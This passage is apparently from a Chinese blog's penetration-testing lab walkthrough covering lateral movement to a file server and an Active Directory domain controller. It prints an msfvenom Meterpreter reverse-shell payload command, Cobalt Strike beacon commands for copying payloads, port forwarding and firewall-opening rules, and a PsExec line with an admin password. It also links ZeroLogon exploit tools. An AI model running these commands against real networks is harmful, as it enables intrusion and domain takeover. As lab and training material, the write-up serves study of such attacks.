+<h2 id="文件服务器"><a href="#文件服务器" class="headerlink" title="文件服务器"></a>文件服务器</h2><p>由于可能存在防火墙，所以需要做一个内网穿透来反向连接服务器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.1.129 lport=7788 -f raw -o msf2.bin</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell copy C:\Windows\Temp\aes2.exe \\10.10.1.128\c$</span></span><br></pre></td></tr></table></figure>
+
+<p>还需要在内网WEB服务器上做一个转发，<strong>注意需要关闭360安全卫士，否则会拦截</strong>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell netsh interface portproxy add v4tov4 listenport=7788 connectaddress=192.168.215.133 connectport=7788</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell netsh interface portproxy show all</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell netsh advfirewall firewall add rule name=<span class="string">&quot;7788&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=7788 action=allow</span></span><br></pre></td></tr></table></figure>
+
+<p>最好在拿到的远程桌面中执行，因为psexec需要点击一个agree。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\10.10.1.128 -u administrator -p QWEasd123 -i c:\aes2.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729151224928.png" alt="image-20230729151224928"></p>
+<p>接下来尝试上线CS，需要使用到转发上线的功能，创建一个新的监听器，开放一下端口，生成载荷上传执行即可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell netsh advfirewall firewall add rule name=<span class="string">&quot;1234&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=1234 action=allow</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729155126846.png" alt="image-20230729155126846"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729160123494.png" alt="image-20230729160123494"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729160133670.png" alt="image-20230729160133670"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729160230558.png" alt="image-20230729160230558"></p>
+<h2 id="AD域控"><a href="#AD域控" class="headerlink" title="AD域控"></a>AD域控</h2><p>msf开启路由和代理开始扫端口。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729162608625.png" alt="image-20230729162608625"></p>
+<p>尝试ZeroLogon (CVE-2020-1472)，适用条件就是能够定位域控主机名及IP，并且可以访问域控。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Captain_RB/article/details/120643838">(18条消息) ZeroLogon (CVE-2020-1472) 漏洞利用_zerologon漏洞_Captain_RB的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1727748">ZeroLogon(CVE-2020-1472) 分析与狩猎-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+</blockquote>
+<p>工具地址：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">SecuraBV&#x2F;CVE-2020-1472: Test tool for CVE-2020-1472 (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">dirkjanm&#x2F;CVE-2020-1472: PoC for Zerologon - all research credits go to Tom Tervoort of Secura (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">fortra&#x2F;impacket：Impacket是用于处理网络协议的Python类的集合。 (github.com)</a></p>
+</blockquote>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729164630423.png" alt="image-20230729164630423"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729165026682.png" alt="image-20230729165026682"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729170352849.png" alt="image-20230729170352849"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729170619970.png" alt="image-20230729170619970"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%9A%97%E6%9C%88/" rel="tag"># 暗月</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/07/23/CTF/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" rel="next" title="2023 巅峰极客">
+                <i class="fa fa-chevron-left"></i> 2023 巅峰极客
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/07/28/Pwn/Ret2dlresolve/" rel="prev" title="Ret2dl-Resolve">
+                Ret2dl-Resolve <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/wechat.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/pursuezhou" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:pursuezhou@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.eonew.cn/" title="Ex" target="_blank">Ex</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xianbeil.github.io/" title="XianBei" target="_blank">XianBei</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://whoamianony.top/" title="WHOAMI" target="_blank">WHOAMI</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.e4l4.com/" title="E4L4" target="_blank">E4L4</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tokameine.top/" title="Tokameine" target="_blank">Tokameine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://toleleyjl.github.io/" title="Tolele" target="_blank">Tolele</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          <div class="wechat_OA">
+    <br>
+    <span>Welcome to my wechat</span>
+    <p></p>
+    <img src ="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/wechat.jpg" width="150" height="150">
+</div>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">外网WEB服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">3.</span> <span class="nav-text">内网WEB服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">4.</span> <span class="nav-text">文件服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AD%E5%9F%9F%E6%8E%A7"><span class="nav-number">5.</span> <span class="nav-text">AD域控</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pursue</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
